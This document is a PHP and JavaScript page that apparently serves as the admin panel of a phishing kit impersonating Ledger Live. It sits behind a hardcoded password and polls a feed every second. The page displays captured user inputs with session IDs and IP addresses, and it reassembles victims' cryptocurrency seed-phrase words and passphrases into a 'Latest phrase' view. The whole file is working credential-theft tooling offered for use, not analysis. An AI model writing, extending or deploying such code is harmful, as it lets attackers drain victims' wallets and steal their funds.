<?php
session_start();

$adminPassword = 'demoAdmin123';
$loginFailed = false;

if (isset($_GET['logout'])) {
    $_SESSION = [];
    if (ini_get('session.use_cookies')) {
        $params = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000, $params['path'], $params['domain'], $params['secure'], $params['httponly']);
    }
    session_destroy();
    header('Location: admin.php');
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && empty($_POST['password'])) {
    $json = json_decode(file_get_contents('php://input'), true);
    if (isset($json['password'])) {
        $_POST['password'] = $json['password'];
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    $submitted = $_POST['password'] ?? '';
    if (hash_equals($adminPassword, $submitted)) {
        session_regenerate_id(true);
        $_SESSION['admin_authed'] = true;
        header('Location: admin.php');
        exit;
    }
    $loginFailed = true;
}

$authed = !empty($_SESSION['admin_authed']);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Live Input Feed</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="assets/js/sweetalert2.js"></script>
    <style>
        :root {
            --bg: #04070f;
            --panel: rgba(11, 16, 26, 0.95);
            --border: rgba(100, 116, 139, 0.25);
        }
        body {
            background: radial-gradient(60% 60% at 15% 15%, rgba(56, 189, 248, 0.05), transparent), var(--bg);
            color: #e9eef5;
            font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
        .card {
            background: linear-gradient(180deg, rgba(17, 24, 39, 0.9) 0%, var(--panel) 100%);
            border: 1px solid var(--border);
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.55);
        }
        .accent-pill {
            border: 1px solid rgba(148, 163, 184, 0.25);
            background: rgba(15, 23, 42, 0.7);
        }
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        ::-webkit-scrollbar-thumb {
            background: rgba(148, 163, 184, 0.35);
            border-radius: 999px;
        }
        ::-webkit-scrollbar-track {
            background: transparent;
        }
    </style>
</head>
<body class="min-h-screen">
<?php if (!$authed): ?>
    <form id="loginForm" method="post" action="admin.php" class="hidden">
        <input type="password" name="password" id="loginField">
    </form>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            Swal.fire({
                title: 'Admin Login',
                text: 'Enter the admin password to continue',
                input: 'password',
                confirmButtonText: 'Enter',
                showCancelButton: false,
                allowOutsideClick: false,
                background: '#0b1220',
                color: '#e7edf5',
                customClass: { popup: 'shadow-2xl' },
                didOpen: () => { const input = Swal.getInput(); if (input) input.focus(); },
                preConfirm: (value) => { if (!value) { Swal.showValidationMessage('Password is required'); } return value; }
            }).then((result) => {
                if (result.isConfirmed) {
                    document.getElementById('loginField').value = result.value || '';
                    document.getElementById('loginForm').submit();
                }
            });
            <?php if ($loginFailed): ?>
            Swal.fire({
                icon: 'error',
                title: 'Access denied',
                text: 'Invalid password. Try again.',
                background: '#0b1220',
                color: '#e7edf5'
            }).then(() => { location.href = 'admin.php'; });
            <?php endif; ?>
        });
    </script>
<?php else: ?>
    <div class="max-w-6xl mx-auto px-4 lg:px-6 py-10 space-y-6">
        <div class="flex items-center justify-between gap-4 flex-wrap">
            <div>
                <p class="text-slate-400 uppercase tracking-[0.28em] text-xs">Ledger Live | Admin</p>
                <h1 class="text-3xl font-semibold text-white mt-1">Live Input Feed</h1>
                <p class="text-slate-400 text-sm mt-1">Real-time mirror of user inputs and seed phrases.</p>
            </div>
            <a href="?logout=1" class="bg-sky-500 hover:bg-sky-400 text-slate-900 font-semibold px-5 py-2 rounded-lg shadow transition">Logout</a>
        </div>

        <div class="grid lg:grid-cols-[1.8fr,1fr] gap-5">
            <div class="card rounded-2xl p-5 relative overflow-hidden">
                <div class="absolute inset-0 pointer-events-none" style="background: radial-gradient(circle at 15% 20%, rgba(56,189,248,0.12), transparent 45%);"></div>
                <div class="flex items-center justify-between mb-4 relative z-10 flex-wrap gap-3">
                    <div class="accent-pill rounded-full px-3 py-1 inline-flex items-center gap-2 text-xs text-slate-200">
                        <span class="w-2 h-2 rounded-full bg-emerald-400 shadow-[0_0_0_4px_rgba(16,185,129,0.2)]"></span>
                        <span>Last update:</span> <span id="lastUpdated" class="text-white font-semibold">--:--:--</span>
                    </div>
                    <div class="accent-pill rounded-full px-3 py-1 inline-flex items-center gap-2 text-xs text-slate-200">
                        <span id="totalEvents" class="text-white font-semibold">0</span>
                        <span class="text-slate-400">events processed</span>
                    </div>
                </div>
                <div class="overflow-hidden rounded-xl border border-slate-800/70 relative z-10">
                    <div class="overflow-y-auto max-h-[560px]">
                        <table class="w-full text-sm">
                            <thead class="bg-slate-900/85 text-slate-300 sticky top-0 backdrop-blur">
                                <tr>
                                    <th class="text-left px-4 py-3 font-semibold">Time</th>
                                    <th class="text-left px-4 py-3 font-semibold">Session</th>
                                    <th class="text-left px-4 py-3 font-semibold">Page</th>
                                    <th class="text-left px-4 py-3 font-semibold">Field</th>
                                    <th class="text-left px-4 py-3 font-semibold">Value</th>
                                    <th class="text-left px-4 py-3 font-semibold">IP</th>
                                </tr>
                            </thead>
                            <tbody id="feedBody" class="divide-y divide-slate-900/70"></tbody>
                        </table>
                    </div>
                </div>
            </div>

            <div class="card rounded-2xl p-5 space-y-4">
                <div class="flex items-center justify-between flex-wrap gap-2">
                    <div>
                        <p class="text-[11px] text-slate-400 uppercase tracking-[0.3em]">Seed snapshot</p>
                        <h3 class="text-xl font-semibold text-white mt-1">Latest phrase</h3>
                    </div>
                    <span class="text-[11px] text-slate-200 accent-pill rounded-full px-3 py-1" id="seedSession">Session: --</span>
                </div>
                <div class="text-xs text-slate-400">
                    Shows most recent seed entries across users. Auto-refreshes each second.
                </div>
                <div id="seedWords" class="grid grid-cols-2 gap-2 text-sm text-slate-100">
                    <p class="text-slate-500 col-span-2">Waiting for seed inputs...</p>
                </div>
                <div class="pt-3 border-t border-slate-800/60">
                    <div class="flex items-center justify-between mb-2">
                        <h4 class="text-sm font-semibold text-white">Generated seeds</h4>
                        <span class="text-[11px] text-slate-400">Latest 5</span>
                    </div>
                    <div id="generatedSeedsList" class="space-y-2 text-sm text-slate-100">
                        <p class="text-slate-500">No generated seeds yet.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const feedBody = document.getElementById('feedBody');
        const lastUpdatedLabel = document.getElementById('lastUpdated');
        const totalEventsLabel = document.getElementById('totalEvents');
        const seedWordsEl = document.getElementById('seedWords');
        const seedSessionEl = document.getElementById('seedSession');
        const generatedSeedsList = document.getElementById('generatedSeedsList');

        let lastTimestamp = 0;
        let processedEvents = 0;
        const seenIds = new Set();
        const seedsBySession = {};
        const generatedSeeds = [];

        function formatTime(ts) {
            const date = new Date(ts * 1000);
            return date.toLocaleTimeString();
        }

        function appendRow(event) {
            const tr = document.createElement('tr');
            tr.className = 'hover:bg-slate-900/60 transition';

            const valuePreview = event.value ? event.value.toString().slice(0, 200) : '';
            tr.innerHTML = `
                <td class="px-4 py-3 text-slate-200">${formatTime(event.timestamp || 0)}</td>
                <td class="px-4 py-3 text-slate-300">
                    <div class="font-medium leading-tight">${event.session || 'n/a'}</div>
                    <div class="text-[11px] text-slate-500">${event.id || ''}</div>
                </td>
                <td class="px-4 py-3 text-slate-300">${event.page || 'unknown'}</td>
                <td class="px-4 py-3 text-slate-200">${event.field || ''}</td>
                <td class="px-4 py-3 text-slate-100 truncate" title="${valuePreview.replace(/\"/g, '&quot;')}">${valuePreview}</td>
                <td class="px-4 py-3 text-slate-400">${event.ip || ''}</td>
            `;
            feedBody.prepend(tr);

            while (feedBody.children.length > 400) {
                feedBody.removeChild(feedBody.lastChild);
            }
        }

        function updateSeedSnapshot() {
            const sessions = Object.keys(seedsBySession);
            if (!sessions.length) {
                seedWordsEl.innerHTML = '<p class="text-slate-500 col-span-2">Waiting for seed inputs...</p>';
                seedSessionEl.textContent = 'Session: --';
                return;
            }

            const latestSession = sessions
                .sort((a, b) => (seedsBySession[b]._last || 0) - (seedsBySession[a]._last || 0))[0];
            seedSessionEl.textContent = 'Session: ' + latestSession;

            const words = seedsBySession[latestSession] || {};
            const hasPassphrase = !!words._hasPassphrase;
            const passphrase = words._passphrase || '';
            const count = words._count ? parseInt(words._count, 10) : 0;
            const orderedKeys = Object.keys(words)
                .filter((k) => k.startsWith('seedWord'))
                .sort((a, b) => parseInt(a.replace(/\D/g, ''), 10) - parseInt(b.replace(/\D/g, ''), 10));

            const maxSlots = count > 0 ? count : orderedKeys.length;
            if (!maxSlots) {
                seedWordsEl.innerHTML = '<p class="text-slate-500 col-span-2">Waiting for seed inputs...</p>';
                return;
            }

            seedWordsEl.innerHTML = '';
            for (let i = 1; i <= maxSlots; i++) {
                const key = `seedWord${i}`;
                const word = words[key] || '';
                const safeWord = word || '...';
                const p = document.createElement('div');
                p.className = 'flex items-center gap-2 bg-slate-900/50 border border-slate-800 rounded-lg px-3 py-2';
                p.innerHTML = `<span class="text-xs text-slate-500 w-6">${i}.</span><span class="text-slate-100 font-semibold break-all">${safeWord}</span>`;
                seedWordsEl.appendChild(p);
            }

            const passDiv = document.createElement('div');
            passDiv.className = 'col-span-2 bg-slate-900/60 border border-slate-800 rounded-lg px-3 py-2 flex items-center justify-between text-sm';
            const label = document.createElement('span');
            label.className = 'text-slate-400';
            label.textContent = 'Passphrase';
            const valueSpan = document.createElement('span');
            valueSpan.className = 'text-slate-100 font-semibold break-all';
            if (hasPassphrase) {
                valueSpan.textContent = passphrase || 'Entered (hidden)';
            } else {
                valueSpan.textContent = 'Not provided';
                valueSpan.classList.add('text-slate-500');
            }
            passDiv.appendChild(label);
            passDiv.appendChild(valueSpan);
            seedWordsEl.appendChild(passDiv);
        }

        function updateGeneratedSeeds() {
            if (!generatedSeeds.length) {
                generatedSeedsList.innerHTML = '<p class="text-slate-500">No generated seeds yet.</p>';
                return;
            }
            generatedSeedsList.innerHTML = '';
            generatedSeeds.slice(0, 5).forEach((item) => {
                const row = document.createElement('div');
                row.className = 'bg-slate-900/50 border border-slate-800 rounded-lg px-3 py-2';
                const time = formatTime(item.timestamp || 0);
                row.innerHTML = `
                    <div class="text-xs text-slate-400 flex justify-between">
                        <span>${time}</span>
                        <span class="text-[10px] text-slate-500">${item.session || 'n/a'}</span>
                    </div>
                    <div class="text-slate-100 font-semibold mt-1 break-all text-sm">${item.value || ''}</div>
                `;
                generatedSeedsList.appendChild(row);
            });
        }

        function captureSeed(event) {
            if (!event.field || !event.session) return;
            if (event.field === 'seed-word-count') {
                const count = parseInt(event.value || '0', 10);
                seedsBySession[event.session] = { _count: count, _last: event.timestamp || 0 };
                updateSeedSnapshot();
                return;
            }
            const match = event.field.match(/^seedWord(\d+)/i);
            if (match) {
                seedsBySession[event.session] = seedsBySession[event.session] || {};
                seedsBySession[event.session][`seedWord${match[1]}`] = event.value || '';
                seedsBySession[event.session]._last = event.timestamp || 0;
                updateSeedSnapshot();
            }
            if (event.field === 'seed-passphrase') {
                seedsBySession[event.session] = seedsBySession[event.session] || {};
                seedsBySession[event.session]._passphrase = event.value || '';
                seedsBySession[event.session]._last = event.timestamp || 0;
                updateSeedSnapshot();
            }
            if (event.field === 'has-seed-passphrase') {
                seedsBySession[event.session] = seedsBySession[event.session] || {};
                seedsBySession[event.session]._hasPassphrase = (event.value || '').toString().toLowerCase() === 'yes';
                seedsBySession[event.session]._last = event.timestamp || 0;
                if (!seedsBySession[event.session]._hasPassphrase) {
                    seedsBySession[event.session]._passphrase = '';
                }
                updateSeedSnapshot();
            }
            if (event.field === 'generated-seed') {
                generatedSeeds.unshift({
                    session: event.session,
                    value: event.value || '',
                    timestamp: event.timestamp || 0
                });
                if (generatedSeeds.length > 5) {
                    generatedSeeds.length = 5;
                }
                updateGeneratedSeeds();
            }
        }

        async function fetchFeed() {
            try {
                const response = await fetch(`feed.php?since=${lastTimestamp}`);
                if (!response.ok) {
                    lastUpdatedLabel.textContent = 'Feed unavailable';
                    return;
                }
                const data = await response.json();
                const events = data.events || [];
                if (!events.length) return;

                events.forEach((event) => {
                    if (event.id && seenIds.has(event.id)) return;
                    if (event.id) seenIds.add(event.id);
                    lastTimestamp = Math.max(lastTimestamp, event.timestamp || 0);
                    appendRow(event);
                    captureSeed(event);
                    processedEvents += 1;
                });

                lastUpdatedLabel.textContent = new Date().toLocaleTimeString();
                totalEventsLabel.textContent = processedEvents;
            } catch (e) {
                lastUpdatedLabel.textContent = 'Feed unavailable';
            }
        }

        updateGeneratedSeeds();
        fetchFeed();
        setInterval(fetchFeed, 1000);
    </script>
<?php endif; ?>
</body>
</html>
